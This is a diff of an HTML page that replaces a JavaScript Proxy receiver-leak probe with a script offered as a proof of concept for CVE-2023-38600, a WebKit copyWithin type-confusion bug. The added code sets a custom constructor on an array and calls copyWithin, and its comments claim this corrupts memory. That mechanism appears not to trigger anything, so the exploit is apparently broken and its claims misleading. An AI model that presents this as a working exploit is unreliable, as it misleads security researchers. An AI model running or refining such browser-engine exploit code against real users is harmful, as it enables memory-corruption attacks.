@@ -1,36 +1,45 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Proxy Super Leak Type Inspect</title>
+  <title>CVE-2023-38600 WebKit copyWithin PoC</title>
   <meta charset="UTF-8">
 </head>
 <body>
+<h1>CVE-2023-38600 (WebKit copyWithin) Proof of Concept</h1>
+<pre id="log"></pre>
 <script>
-var leakedReceiver;
-const handler = {
-  get(target, prop, receiver) {
-    leakedReceiver = receiver;
-    if (prop === "foo") return function() {};
-    return target[prop];
-  }
-};
-
-const base = new Proxy({}, handler);
-
-class Exploit extends Object {
-  foo() { return super.foo(); }
+function log(msg) {
+  document.getElementById('log').textContent += msg + "\n";
 }
-Object.setPrototypeOf(Exploit.prototype, base);
 
-const obj = new Exploit();
-obj.foo();
+try {
+  // Create a JSArray with custom constructor to trigger type confusion
+  let arr = [1.1, 2.2, 3.3, 4.4];
+  let crafted = null;
 
-var type = leakedReceiver ? (leakedReceiver.constructor && leakedReceiver.constructor.name) : "undefined/null";
-document.body.innerHTML = "<pre style='font-size:2em;'>"
-  + "leakedReceiver: " + leakedReceiver + "\n"
-  + "Type: " + type + "\n"
-  + "typeof: " + (typeof leakedReceiver) + "\n"
-  + "</pre>";
+  // The crafted constructor returns a TypedArray which will be used in copyWithin's fast path
+  arr.constructor = function() {
+    crafted = new Float64Array(8); // Chosen size is arbitrary for PoC
+    log("[*] Custom constructor called, returning crafted Float64Array: " + crafted);
+    return crafted;
+  };
+
+  log("[*] Before copyWithin, arr: " + arr);
+
+  // The core of the bug: triggers type confusion in WebKit JSC
+  arr.copyWithin(1, 2, 3);
+
+  log("[*] After copyWithin, arr: " + arr);
+
+  // Show crafted array contents
+  log("[*] Crafted array contents: " + Array.from(crafted));
+
+  // If vulnerable, this may cause memory corruption, crash, or strange values in 'crafted'
+  log("[*] If you see abnormal output or a crash, this browser is likely vulnerable to CVE-2023-38600.");
+
+} catch (e) {
+  log("[!] Exception: " + e);
+}
 </script>
 </body>
 </html>
